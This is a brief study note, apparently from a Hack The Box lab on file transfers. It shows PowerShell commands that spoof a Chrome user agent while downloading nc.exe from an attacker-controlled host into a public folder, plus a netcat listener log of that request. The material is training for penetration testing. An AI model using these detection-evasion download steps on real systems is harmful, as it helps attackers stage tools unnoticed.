---
Title: HTB\File_Transfers\evading detection
tags:
  - os/windows
  - os/linux-
source: HTB\File_Transfers\evading detection
---

# HTB\File_Transfers\evading detection

> Źródło: `HTB\File_Transfers\evading detection`

Listing user agents
```powershell
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Invoking Invoke-WebRequest to download nc.exe using chrome agent
```powershell
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

```bash
Ovas420@htb[/htb]$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```


**Powiązane:** [[Graph-Home]] [[OS-Windows]] [[OS-Linux]]
